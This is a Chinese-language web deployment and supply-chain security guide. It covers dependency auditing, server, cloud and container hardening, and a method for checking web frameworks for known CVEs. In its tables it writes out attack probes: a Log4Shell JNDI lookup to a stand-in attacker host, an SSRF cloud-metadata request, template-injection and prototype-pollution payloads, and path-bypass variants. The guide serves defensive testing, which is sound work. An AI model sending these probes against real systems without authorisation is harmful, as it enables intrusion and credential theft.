# Web部署与供应链安全

> **来源**: 基于WooYun漏洞库实战经验 + 云安全最佳实践 + OWASP供应链安全指南提炼
> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析
> **相关**: AI应用容器逃逸测试 → [ai-baseline-security.md](ai-baseline-security.md)

---

## 一、供应链与组件安全

### 1.1 漏洞本质

```
供应链风险 = 第三方代码信任 × 传递性依赖深度 × 更新滞后
```

应用中 70-90% 的代码来自开源组件，一个高危组件漏洞可影响数万项目（如 Log4Shell、Polyfill.io）。

### 1.2 前端供应链

**npm/yarn 依赖风险**

| 攻击类型 | 说明 | 典型案例 |
|----------|------|----------|
| 恶意包 | 名称相似的恶意包(typosquatting) | `crossenv` 窃取环境变量 |
| 原型污染 | `lodash`/`jQuery` 原型链污染 | CVE-2019-10744 |
| 依赖劫持 | 维护者账号被接管后植入后门 | `event-stream` 挖矿 |
| CDN投毒 | 公共CDN托管的JS被篡改 | Polyfill.io供应链攻击 |
| 构建注入 | package.json scripts钩子执行恶意命令 | `postinstall` 脚本攻击 |

**检测方法**

```bash
# 审计已知漏洞
npm audit
yarn audit

# 检查过时依赖
npm outdated

# 查看依赖树深度
npm ls --all | head -100

# 检查可疑的安装脚本
npm pack --dry-run  # 查看将要安装的文件
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 后端供应链

**Python/pip**

```bash
# 已知漏洞审计
pip-audit
safety check

# 查看依赖
pip list --outdated
pipdeptree  # 可视化依赖树
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# 查看依赖树
mvn dependency:tree
```

**常见高危组件漏洞速查**

| 组件 | CVE | 影响 | 检测 |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoType反序列化 |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-Type注入 |
| Jackson | CVE-2019-12384 | RCE | 多态反序列化 |
| Commons-Collections | CVE-2015-6420 | RCE | Java反序列化链 |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTML注入 |
| Lodash | CVE-2021-23337 | RCE | 模板注入 |

### 1.4 Docker镜像供应链

```bash
# 镜像漏洞扫描
trivy image <image:tag>
grype <image:tag>

# 检查基础镜像
docker inspect <image> | grep -i "rootfs\|created\|author"

# 查看镜像层历史(发现隐藏文件/密钥)
docker history --no-trunc <image>
```

**风险点**：
- 使用 `latest` 标签而非固定版本
- 基础镜像过大(包含不必要工具如gcc/curl)
- Dockerfile中硬编码密钥/凭据
- 以root用户运行容器

### 1.5 SCA工具推荐

| 工具 | 语言/场景 | 特点 |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | 内置,免费 |
| `pip-audit` / `safety` | Python | 免费 |
| OWASP Dependency-Check | Java/.NET | 开源,支持多语言 |
| Snyk | 全语言 | SaaS,最全漏洞库 |
| Trivy | 容器/IaC/SBOM | 开源,速度快 |
| Grype | 容器镜像 | 开源,Anchore出品 |
| Renovate / Dependabot | 自动升级 | GitHub集成 |

### 1.6 SBOM(软件物料清单)

```bash
# 生成 SBOM (CycloneDX格式)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# 生成 SBOM (SPDX格式)
syft <image> -o spdx-json > sbom.spdx.json   # 容器镜像
```

SBOM 用途：合规审计、许可证合规、漏洞追踪、供应链透明度。

### 1.7 防御措施

- **锁定版本**: 使用 `package-lock.json` / `Pipfile.lock` / `pom.xml` 固定版本
- **最小依赖**: 定期清理未使用依赖，避免传递性依赖膨胀
- **CI集成**: 在CI/CD中加入SCA扫描，漏洞阻断构建
- **私有仓库**: 使用Nexus/Verdaccio代理，避免直接拉取公共仓库
- **签名验证**: npm支持`npm audit signatures`验证包签名
- **定期更新**: 设置Dependabot/Renovate自动创建升级PR

---

## 二、云部署与服务器安全

### 2.1 风险本质

```
部署风险 = 默认配置信任 × 暴露面积 × 运维疏忽
```

应用代码安全不等于系统安全。部署环境的错误配置往往是攻击者最先利用的突破口。

### 2.2 服务器加固检查

**端口与服务**

```bash
# 扫描开放端口
nmap -sV -p- <target>

# 高危端口速查
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(管理) 2375(Docker API) 10250(Kubelet)
```

| 检查项 | 安全配置 | 风险 |
|--------|----------|------|
| SSH | 禁用root登录、密钥认证、非22端口 | 暴力破解 |
| 数据库端口 | 仅绑定127.0.0.1/内网IP | 未授权访问 |
| Redis | 设置密码、禁用外网、rename危险命令 | RCE(写webshell/crontab/ssh) |
| MongoDB | 启用认证、绑定内网 | 数据泄露 |
| Docker API | 绑定Unix Socket、启用TLS | 容器逃逸/RCE |
| Elasticsearch | X-Pack认证、禁用外网 | 数据泄露 |
| Kubernetes API | RBAC、网络策略、审计日志 | 集群接管 |

**操作系统加固**

```bash
# Linux加固检查
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # 非法root用户
find / -perm -4000 2>/dev/null        # SUID文件
crontab -l                            # 定时任务后门
last -20                              # 最近登录记录
ss -tlnp                              # 监听端口
iptables -L -n                        # 防火墙规则
```

### 2.3 TLS/SSL/HTTPS 配置

**测试方法**

```bash
# SSL/TLS配置检查
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# 在线检查
# https://www.ssllabs.com/ssltest/
```

**常见问题**

| 问题 | 风险 | 修复 |
|------|------|------|
| TLS 1.0/1.1 未禁用 | BEAST/POODLE攻击 | 仅启用TLS 1.2+ |
| 弱密码套件(RC4/DES/MD5) | 降级攻击 | 使用AES-GCM/ChaCha20 |
| 证书过期/自签名 | 中间人攻击 | 使用Let's Encrypt/CA证书 |
| 缺少HSTS头 | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| 混合内容(HTTP+HTTPS) | 内容劫持 | 全站HTTPS+CSP |

**Nginx安全配置参考**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # 安全头
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # 隐藏版本
    server_tokens off;
    
    # 禁止目录列表
    autoindex off;
}
```

### 2.4 云服务安全

**通用云风险 (AWS/Azure/GCP/阿里云)**

| 风险 | 检测方法 | 影响 |
|------|----------|------|
| S3/OSS桶公开 | `aws s3 ls s3://bucket --no-sign-request` | 数据泄露 |
| IAM权限过宽 | 检查`*`通配符策略 | 权限提升 |
| 安全组全开 | 检查`0.0.0.0/0`入站规则 | 暴露内部服务 |
| 密钥硬编码 | `trufflehog`/`gitleaks` 扫描代码仓库 | 账户接管 |
| 元数据服务 | `curl http://169.254.169.254/` (SSRF利用) | 凭据窃取 |
| 日志未开启 | CloudTrail/ActionTrail审计 | 无法溯源 |

**PaaS平台风险 (Railway/Vercel/Heroku/Netlify)**

| 风险 | 说明 | 检测 |
|------|------|------|
| 环境变量泄露 | 构建日志/错误页面暴露ENV | 查看公开构建日志 |
| 域名接管 | CNAME指向已删除的PaaS应用 | `dig CNAME <domain>` 检查悬挂记录 |
| 共享运行时逃逸 | 多租户容器间隔离不足 | 探测同节点服务 |
| 部署凭据泄露 | API Token在CI配置中明文 | 审查CI/CD配置文件 |
| 函数注入 | Serverless函数的事件注入 | 测试事件参数可控性 |

**云密钥泄露检测**

```bash
# 代码仓库扫描
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# 常见泄露位置
.env / .env.production / .env.local
docker-compose.yml
CI配置: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
前端代码: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 容器与编排安全

> **AI应用容器逃逸**: 针对AI Agent/LLM部署环境的容器逃逸测试方法论 → [ai-baseline-security.md](ai-baseline-security.md) §二十

**Docker安全检查**

```bash
# 容器以非root运行
docker inspect <container> | grep '"User"'

# 检查特权模式
docker inspect <container> | grep '"Privileged"'

# 检查挂载(敏感目录)
docker inspect <container> | grep -A10 '"Mounts"'

# 检查Capabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Kubernetes安全检查**

```bash
# RBAC审计
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Pod安全
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Secret明文检查
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# 网络策略
kubectl get networkpolicy -A
```

### 2.6 CI/CD流水线安全

| 风险 | 说明 | 防御 |
|------|------|------|
| 密钥明文存储 | Pipeline配置中硬编码密钥 | 使用Vault/Sealed Secrets |
| 依赖不可信 | CI中拉取未验证的构建工具 | 锁定CI镜像版本 |
| 构建注入 | PR中修改CI配置执行恶意代码 | Fork PR需审批后才能触发CI |
| 制品篡改 | 构建产物未签名 | Cosign/Notary签名 |
| 权限过宽 | CI Token拥有管理员权限 | 最小权限Token |

### 2.7 部署安全Checklist

**服务器**
- [ ] SSH密钥登录,禁用密码和root
- [ ] 防火墙仅开放必要端口(80/443)
- [ ] 数据库/缓存仅监听内网
- [ ] 定期更新OS和中间件补丁
- [ ] 启用审计日志和入侵检测

**HTTPS**
- [ ] TLS 1.2+ 且禁用弱密码套件
- [ ] HSTS头 + CAA记录
- [ ] 证书自动续期(Let's Encrypt)

**云服务**
- [ ] IAM最小权限 + MFA
- [ ] 存储桶私有 + 加密
- [ ] 安全组限制来源IP
- [ ] CloudTrail/审计日志启用
- [ ] 密钥通过KMS/Vault管理,不硬编码

**容器**
- [ ] 非root用户运行
- [ ] 只读文件系统
- [ ] 无特权模式 + 最小Capabilities
- [ ] 镜像扫描(Trivy/Grype)
- [ ] 网络策略隔离Pod间通信

**CI/CD**
- [ ] 密钥通过Secret管理,不在配置文件中
- [ ] SCA扫描集成到构建流水线
- [ ] 制品签名验证
- [ ] Fork PR审批后才触发构建

---

## 三、通用Web框架CVE检测方法论

> 适用于 Next.js、Spring Boot、Django、Rails、Express、Laravel 等任何Web框架的已知CVE检测与利用验证

### 3.1 框架指纹识别

**自动化指纹采集**

| 指纹来源 | 检测方法 | 信息提取 |
|----------|----------|----------|
| HTTP响应头 | 检查`X-Powered-By`、`Server`、`X-Framework` | 框架名称和版本 |
| Cookie名称 | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | 框架类型 |
| 默认错误页面 | 触发404/500，分析页面特征、样式、文案 | 框架+调试模式 |
| 静态资源路径 | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | 框架+构建工具 |
| JS文件内容 | 搜索`webpack`/`vite`/`turbopack`标识、框架版本字符串 | 精确版本号 |
| Source Map | 访问`*.js.map`检查是否泄露、分析import路径 | 框架+依赖库完整列表 |
| 元标签/注释 | HTML中的`<meta name="generator">`、构建注释 | 框架版本 |
| package.json泄露 | 访问`/package.json`、`/composer.json`、`/Gemfile.lock` | 全部依赖及精确版本 |

```
指纹识别流程:
1. 被动收集 → 响应头、Cookie、HTML、JS分析
2. 主动探测 → 默认路径、错误触发、配置文件访问
3. 版本锁定 → 精确到主版本.次版本.补丁版本
4. CVE匹配 → NVD/Snyk/GitHub Advisory 查询
```

### 3.2 CVE检索与PoC验证

**CVE数据源**

| 数据源 | URL | 特点 |
|--------|-----|------|
| NVD | nvd.nist.gov | 官方CVE库，CVSS评分 |
| GitHub Advisory | github.com/advisories | 开源项目漏洞，含PoC链接 |
| Snyk | snyk.io/vuln | 依赖级精确匹配 |
| Exploit-DB | exploit-db.com | 已验证PoC和EXP |
| PacketStorm | packetstormsecurity.com | 安全公告和利用代码 |
| 框架ChangeLog | 框架官方Release Notes | 安全修复细节 |

**通用CVE验证流程**

```
1. 版本比对
   确认版本号 → 查CVE影响范围(affected versions) → 确认是否在影响范围内

2. PoC复现
   a. 搜索公开PoC (GitHub/Exploit-DB/安全博客)
   b. 理解漏洞原理(补丁diff是最佳资料)
   c. 在测试环境构造请求验证
   d. 注意: 生产环境仅验证触发条件,不执行破坏性Payload

3. 补丁分析(L4防御反推)
   a. 对比修复前后代码diff → 理解修复了什么
   b. 反推: 修复前的处理逻辑中哪里存在缺陷
   c. 思考: 修复是否完整?是否存在绕过修复的可能?
```

### 3.3 常见框架攻击面分类

| 攻击面类型 | 通用检测方法 | 典型漏洞模式 |
|-----------|-------------|-------------|
| **路由/中间件绕过** | 路径规范化测试: `//path`、`/./path`、`/%2e/path`、大小写变体、特殊请求头伪造 | 认证绕过、鉴权跳过 |
| **模板/渲染注入** | 在参数中注入模板语法: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **反序列化** | 识别序列化格式(`ac ed 00 05`/`O:`/`rO0AB`), 发送恶意序列化数据 | Java/PHP/Python反序列化RCE |
| **Server Actions/RPC** | 拦截框架特有的RPC调用,分析端点标识,直接调用绕过前端校验 | CSRF、输入验证绕过 |
| **SSR/RSC注入** | 拦截并修改服务端渲染参数(如`_rsc`/`__data`/`loader`),构造异常Payload | 服务端代码执行 |
| **配置文件泄露** | 遍历常见配置路径: `.env`、`web.config`、`application.yml`、`settings.py` | 密钥/凭据泄露 |
| **调试端点** | 检查框架调试模式: `/debug`、`/_debug`、`/__inspect`、`/graphql`(introspection) | 信息泄露→RCE |
| **原型污染(JS)** | JSON请求体中注入`{"__proto__":{"isAdmin":true}}`或`{"constructor":{"prototype":{"x":1}}}` | 权限提升、DoS |
| **缓存投毒** | 操纵缓存Key相关头(`X-Forwarded-Host`/`X-Original-URL`), 验证响应是否被缓存 | 存储型XSS、钓鱼 |

### 3.4 框架安全通用Checklist

```
[ ] 确认框架及所有依赖的精确版本
[ ] 查询NVD/Snyk/GitHub Advisory对应CVE
[ ] 验证所有高危CVE(CVSS≥7.0)是否已修复
[ ] Source Map是否已禁用
[ ] 调试模式是否已关闭
[ ] 错误页面是否泄露堆栈/路径/版本
[ ] 默认配置文件路径是否可访问
[ ] 中间件/路由鉴权是否可通过路径变体绕过
[ ] API端点是否全部需要认证(删除Cookie/Token测试)
[ ] 安全响应头是否完整(CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] CSRF保护是否覆盖所有状态变更操作
[ ] 框架特有的RPC/Action端点是否有独立鉴权
```

---

*基于WooYun漏洞库(88,636条)提炼 + 云/供应链安全最佳实践 | 仅供安全研究与防御参考*
